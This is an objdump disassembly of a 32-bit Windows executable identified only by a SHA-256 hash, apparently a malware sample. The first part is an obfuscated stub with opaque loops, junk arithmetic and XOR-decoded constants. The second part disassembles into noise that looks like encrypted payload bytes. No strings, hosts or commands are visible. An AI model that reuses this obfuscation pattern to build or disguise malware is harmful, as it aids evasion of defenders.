
01ee8378b6cfffa6abf1477b57ec0f11c25812bda89e79643665713dae160141.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x8eabc454
  40157e:	sub    al,0x98
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [edi-0x75747576],edi
  401599:	mov    bl,0x22
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x215c06c4],0xc1
  40162d:	repz and ebp,edx
  401630:	mov    ebp,0x9367c1fb
  401635:	jle    0x401651
  401637:	cmp    ecx,ebp
  401639:	pusha  
  40163a:	push   es
  40163b:	and    esi,DWORD PTR [ebp+0x58]
  40163e:	mov    esp,0x891e9e4
  401643:	push   esp
  401644:	out    dx,eax
  401645:	mov    al,ds:0x8cae5bda
  40164a:	mov    edi,0x14f32e69
  40164f:	imul   ebx,eax,0xd8bcd27
  401655:	retf   0x30b
  401658:	in     al,0x50
  40165a:	outs   dx,BYTE PTR ds:[esi]
  40165b:	xchg   esi,eax
  40165c:	cmp    DWORD PTR [ecx+0x57],ebx
  40165f:	sub    edi,edx
  401661:	and    dl,BYTE PTR [edx-0x3b65a009]
  401667:	inc    esp
  401668:	sbb    BYTE PTR [ebp-0x80],bh
  40166b:	sti    
  40166c:	div    BYTE PTR [ebx-0x2283d043]
  401672:	push   ecx
  401673:	out    0x41,al
  401675:	cs push cs
  401677:	das    
  401678:	jnp    0x401628
  40167a:	out    dx,eax
  40167b:	or     dl,ah
  40167d:	cmc    
  40167e:	scas   eax,DWORD PTR es:[edi]
  40167f:	add    edi,DWORD PTR [edx]
  401681:	mov    ?,edi
  401683:	cmp    eax,0xd6b83d03
  401688:	pop    edx
  401689:	xor    ebp,DWORD PTR [ecx+0xc]
  40168c:	xor    bl,al
  40168e:	scas   al,BYTE PTR es:[edi]
  40168f:	jl     0x4016f4
  401691:	adc    bh,BYTE PTR [ebp-0x8]
  401694:	sub    BYTE PTR [edx+eiz*1],dh
  401697:	sahf   
  401698:	lahf   
  401699:	cmc    
  40169a:	ret    
  40169b:	test   al,0x94
  40169d:	sub    DWORD PTR [esi+0x10],eax
  4016a0:	jmp    0xa5ac794c
  4016a5:	sbb    BYTE PTR [ecx],al
  4016a7:	pop    ebp
  4016a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a9:	xchg   DWORD PTR ds:0xc7dde1ee,esi
  4016af:	icebp  
  4016b0:	lods   al,BYTE PTR ds:[esi]
  4016b1:	push   cs
  4016b2:	pop    esi
  4016b3:	stos   BYTE PTR es:[edi],al
  4016b4:	and    al,0xcd
  4016b6:	icebp  
  4016b7:	sbb    BYTE PTR [ebp+0x63],0xe7
  4016bb:	aas    
  4016bc:	aad    0xe5
  4016be:	cdq    
  4016bf:	fnstcw WORD PTR [edx+0x2f]
  4016c2:	inc    esi
  4016c3:	dec    ecx
  4016c4:	or     ch,BYTE PTR [ecx+0x28f3a016]
  4016ca:	cmp    bh,BYTE PTR [eax+0x5867c1da]
  4016d0:	xlat   BYTE PTR ds:[ebx]
  4016d1:	enter  0x4926,0xea
  4016d5:	mov    esp,0x88bd51a8
  4016da:	repz mov eax,ebp
  4016dd:	retf   0x69b6
  4016e0:	cwde   
  4016e1:	inc    ebx
  4016e2:	pop    ecx
  4016e3:	fwait
  4016e4:	and    BYTE PTR [edx],cl
  4016e6:	push   edi
  4016e7:	shr    DWORD PTR [esi],cl
  4016e9:	xchg   edx,eax
  4016ea:	in     al,dx
  4016eb:	loopne 0x4016d0
  4016ed:	mov    bl,BYTE PTR [ebp-0x3f29c4b2]
  4016f3:	pop    ecx
  4016f4:	add    eax,0x655ce090
  4016f9:	das    
  4016fa:	mov    WORD PTR [eax],fs
  4016fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016fd:	inc    eax
  4016fe:	shr    BYTE PTR ds:0xa73e5c9d,cl
  401704:	jne    0x4016b2
  401706:	inc    ecx
  401707:	fcomp  QWORD PTR [edx+edi*8-0x5d]
  40170b:	ficom  DWORD PTR [edx-0x2465e7af]
  401711:	std    
  401712:	popa   
  401713:	push   edi
  401714:	cmp    ch,BYTE PTR [edi+eax*2]
  401717:	lahf   
  401718:	pushf  
  401719:	mov    dh,0x71
  40171b:	push   ss
  40171c:	je     0x4016cd
  40171e:	loopne 0x401747
  401720:	add    DWORD PTR [edi+esi*1-0x8],ebp
  401724:	jnp    0x401759
  401726:	loope  0x401732
  401728:	pop    edi
  401729:	mov    cl,BYTE PTR [edi-0x4]
  40172c:	jge    0x4016d7
  40172e:	cmp    al,0x78
  401730:	xchg   edx,eax
  401731:	les    ebx,FWORD PTR [edi-0x4e]
  401734:	inc    ecx
  401735:	xchg   DWORD PTR [ecx-0x402df442],ebx
  40173b:	(bad)  
  40173c:	jmp    0x401704
  40173e:	fiadd  DWORD PTR [ebx+0x20]
  401741:	nop
  401742:	xor    dl,ah
  401744:	adc    al,0xf4
  401746:	sub    eax,DWORD PTR [edi+0x63]
  401749:	sub    DWORD PTR [edx],ebx
  40174b:	rol    BYTE PTR [edi+0xec13833],1
  401751:	retf   0xdff9
  401754:	ficom  DWORD PTR [ebp+0x55]
  401757:	dec    esi
  401758:	push   ebx
  401759:	mov    al,0x18
  40175b:	xor    cl,BYTE PTR [eax+0xc]
  40175e:	jb     0x4017b8
  401760:	loopne 0x40173d
  401762:	sub    eax,DWORD PTR [ebx+0x39]
  401765:	mov    esi,0xdccee9ef
  40176a:	mov    dh,0xbb
  40176c:	push   ss
  40176d:	mul    DWORD PTR [ebx]
  40176f:	in     eax,0xe0
  401771:	out    0x11,al
  401773:	add    BYTE PTR [ecx+0x796c9ff4],ah
  401779:	pop    es
  40177a:	and    dl,BYTE PTR [eax+0x3c]
  40177d:	cmp    ebp,DWORD PTR [esp+eiz*4-0x3bdb4a2c]
  401784:	bound  ebx,QWORD PTR [eax+0x4f6f1368]
  40178a:	cmp    bl,BYTE PTR [esp+ebp*8]
  40178d:	add    DWORD PTR [esi-0x4a902c48],0x6d
  401794:	arpl   WORD PTR ds:0x79cc3366,si
  40179a:	and    ebp,ebp
  40179c:	xchg   esp,eax
  40179d:	sbb    dl,BYTE PTR [ebx+0x60]
  4017a0:	or     BYTE PTR [ebx+0x68],0x20
  4017a4:	sbb    BYTE PTR [eax],0x7f
  4017a7:	gs dec edi
  4017a9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4017ab:	(bad)  
  4017ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ad:	xor    BYTE PTR [ebx+ecx*8],bl
  4017b0:	or     BYTE PTR [esi],ah
  4017b2:	jg     0x4017c3
  4017b4:	add    al,0x3a
  4017b6:	xor    bh,ah
  4017b8:	mov    ah,0xe5
  4017ba:	ret    0x6f8b
  4017bd:	cmp    DWORD PTR [eax+0x2d164614],0x1312ace
  4017c7:	addr16 enter 0xc541,0xbe
  4017cc:	push   ds
  4017cd:	(bad)  
  4017cf:	pop    edi
  4017d0:	or     eax,0x6d0a03b0
  4017d5:	jo     0x401802
  4017d7:	aad    0x4a
  4017d9:	xor    DWORD PTR [edi-0x64],eax
  4017dc:	enter  0x459d,0xcf
  4017e0:	xor    dh,BYTE PTR [eax+ebp*2+0x27890ee6]
  4017e7:	lods   al,BYTE PTR ds:[esi]
  4017e8:	cmp    al,dl
  4017ea:	(bad)  
  4017eb:	cld    
  4017ec:	xchg   ecx,eax
  4017ed:	push   ss
  4017ee:	outs   dx,DWORD PTR ds:[esi]
  4017ef:	fsubr  DWORD PTR [edi]
  4017f1:	les    edi,FWORD PTR [ebx-0x66]
  4017f4:	iret   
  4017f5:	ins    BYTE PTR es:[edi],dx
  4017f6:	out    0x28,al
  4017f8:	fst    QWORD PTR [ebx]
  4017fa:	sti    
  4017fb:	mov    eax,0xf782213b
  401800:	pusha  
  401801:	ret    0xceac
  401804:	mov    esp,0x50a9e854
  401809:	ins    BYTE PTR es:[edi],dx
  40180a:	ins    DWORD PTR es:[edi],dx
  40180b:	test   BYTE PTR [ebp+eax*8-0x6bda10c4],bh
  401812:	popf   
  401813:	fsubr  QWORD PTR [ebx+0x16]
  401816:	pop    edi
  401817:	pop    edx
  401818:	mov    ecx,fs
  40181a:	adc    edi,DWORD PTR [esi-0x39]
  40181d:	call   0x8514:0x62a90a30
  401824:	add    DWORD PTR ds:0xa47b1243,edi
  40182a:	cmp    al,0x5f
  40182c:	in     eax,0xf6
  40182e:	retf   0x8de6
  401831:	cmp    BYTE PTR [edx+0x25d371bc],dl
  401837:	or     DWORD PTR [eax-0xe],edi
  40183a:	(bad)  
  40183b:	cld    
  40183c:	xor    bh,BYTE PTR [ebp-0x2598fdce]
  401842:	icebp  
  401843:	fcmove st,st(2)
  401845:	je     0x4018c0
  401847:	jg     0x40188b
  401849:	ds inc ecx
  40184b:	cmp    DWORD PTR [edx+0x11],eax
  40184e:	(bad)  
  40184f:	cmp    DWORD PTR [edx+esi*1],edi
  401852:	mov    BYTE PTR [esi-0x65],0xcc
  401856:	in     eax,0x46
  401858:	(bad)  
  401859:	leave  
  40185a:	je     0x401884
  40185c:	(bad)
  401860:	xchg   edx,esp
  401862:	(bad)  
  401863:	repz retf 0xbcd6
  401867:	pop    ebx
  401868:	push   esp
  401869:	add    cl,BYTE PTR [edi]
  40186b:	fsubr  QWORD PTR [edi]
  40186d:	ror    DWORD PTR [ebp+0x2a],1
  401870:	and    ecx,ebp
  401872:	enter  0x4cc4,0xd7
  401876:	bound  edi,QWORD PTR fs:[eax+0x65]
  40187a:	aad    0x7b
  40187c:	lds    esi,FWORD PTR [ebx]
  40187e:	mov    al,ds:0xf893cb5d
  401883:	xchg   cl,bh
  401885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401886:	not    BYTE PTR [edi+edx*1]
  401889:	xchg   ecx,ebp
  40188b:	pop    edi
  40188c:	xchg   edx,eax
  40188d:	shr    ebp,cl
  40188f:	ins    DWORD PTR es:[edi],dx
  401890:	imul   ebp,DWORD PTR [esi+0x30],0xffffffcd
  401894:	jo     0x40183d
  401896:	arpl   WORD PTR [edx+0x68],dx
  401899:	fcmove st,st(6)
  40189b:	add    al,0xb
  40189d:	add    DWORD PTR [edx],0xff0885b5
  4018a3:	and    al,0xb
  4018a5:	(bad)  
  4018a6:	adc    eax,DWORD PTR [ebp+0x12dfb7b3]
  4018ac:	dec    eax
  4018ad:	mov    eax,ds:0x598969f7
  4018b2:	add    bh,BYTE PTR [esi]
  4018b4:	xchg   BYTE PTR [eax+0x7f],al
  4018b7:	fdivr  QWORD PTR [ecx]
  4018b9:	ror    al,0xde
  4018bc:	jb     0x401894
  4018be:	mov    ecx,0x2f7b64af
  4018c3:	pop    edi
  4018c4:	in     eax,0xee
  4018c6:	inc    edx
  4018c7:	cwde   
  4018c8:	jo     0x4018f3
  4018ca:	nop
  4018cb:	cmp    al,0x5f
  4018cd:	inc    edi
  4018ce:	dec    edx
  4018cf:	mov    bh,0xde
  4018d1:	cwde   
  4018d2:	push   es
  4018d3:	cmp    ch,BYTE PTR [esi+0x1f]
  4018d6:	xor    bh,BYTE PTR [ebx]
  4018d8:	pop    es
  4018d9:	sbb    al,0x4b
  4018db:	pop    edx
  4018dc:	outs   dx,BYTE PTR ds:[esi]
  4018dd:	mov    WORD PTR [eax-0x77fe1b39],fs
  4018e3:	xchg   ebx,eax
  4018e4:	push   esi
  4018e5:	out    dx,al
  4018e6:	push   0x7bcd1783
  4018eb:	out    0x4c,eax
  4018ed:	dec    edi
  4018ee:	dec    eax
  4018ef:	add    eax,0x66bf62fd
  4018f4:	pop    esp
  4018f5:	fs push ebx
  4018f7:	push   0x1f
  4018f9:	cli    
  4018fa:	xor    al,BYTE PTR [esi-0xa]
  4018fd:	out    dx,al
  4018fe:	or     esp,DWORD PTR [esi]
  401900:	mov    ebp,0xac16a9dc
  401905:	and    al,0x27
  401907:	repnz int 0x49
  40190a:	add    DWORD PTR [ebp-0x68],0x464e64e5
  401911:	enter  0xf228,0xaf
  401915:	or     ecx,DWORD PTR gs:[ebp-0x4a]
  401919:	or     BYTE PTR [edi+0x4c99f6dc],dh
  40191f:	xor    BYTE PTR [ebp-0x71344abf],0xfa
  401926:	cmp    ebp,ebp
  401928:	jno    0x40194c
  40192a:	imul   ebx,DWORD PTR [edi],0xe9ffaad6
  401930:	das    
  401931:	mov    es,WORD PTR [esi-0x2c]
  401934:	mov    BYTE PTR [edx-0x258ee56c],bh
  40193a:	inc    ecx
  40193b:	mov    esp,0xc1b691c9
  401940:	dec    ebp
  401941:	retf   0x876d
  401944:	jmp    0xe5b9:0x1e78a75e
  40194b:	jmp    0x7408:0x7a09bfea
  401952:	jecxz  0x4019c2
  401954:	icebp  
  401955:	inc    DWORD PTR [ecx+0x1c297309]
  40195b:	dec    edi
  40195c:	add    eax,edx
  40195e:	sub    DWORD PTR [edi+0x230bdb05],edx
  401964:	xchg   ebx,eax
  401965:	mov    dh,0x70
  401967:	or     cl,ch
  401969:	ins    DWORD PTR es:[edi],dx
  40196a:	xor    DWORD PTR [eax-0x5c],eax
  40196d:	pushf  
  40196e:	dec    ebx
  40196f:	or     eax,0xf0b1b3aa
  401974:	mov    ch,BYTE PTR [ebx]
  401976:	jmp    0x401998
  401978:	stc    
  401979:	xlat   BYTE PTR ds:[ebx]
  40197a:	aad    0x20
  40197c:	or     al,0xf0
  40197e:	pop    esi
  40197f:	push   eax
  401980:	sub    ah,dh
  401982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401983:	xor    edx,DWORD PTR [esi-0x75e369f9]
  401989:	loope  0x401916
  40198b:	dec    ebp
  40198c:	adc    DWORD PTR [eax],ebp
  40198e:	cmp    eax,0x267b7e55
  401993:	loopne 0x4019c9
  401995:	enter  0x5036,0x15
  401999:	pop    ss
  40199a:	popf   
  40199b:	lahf   
  40199c:	enter  0xad5e,0x75
  4019a0:	dec    edi
  4019a1:	icebp  
  4019a2:	mov    dh,0xc3
  4019a4:	test   al,0x85
  4019a6:	and    dh,BYTE PTR [ecx+edx*8-0x18425d0f]
  4019ad:	xlat   BYTE PTR ds:[ebx]
  4019ae:	(bad)  es:[ebx-0x62]
  4019b2:	loopne 0x401997
  4019b4:	adc    BYTE PTR [ebx-0x2c300c53],dh
  4019ba:	add    al,0xfa
  4019bc:	xchg   esi,eax
  4019bd:	adc    al,0x5d
  4019bf:	cdq    
  4019c0:	or     al,0x6e
  4019c2:	mov    ch,0x5d
  4019c4:	loope  0x4019bf
  4019c6:	mov    ds:0xba76ef6e,eax
  4019cb:	cmc    
  4019cc:	(bad)  
  4019cd:	pop    esi
  4019ce:	popa   
  4019cf:	jne    0x4019a9
  4019d1:	mov    eax,0xa4e46918
  4019d6:	arpl   WORD PTR [ebx+0x51343c48],bp
  4019dc:	in     eax,0xe9
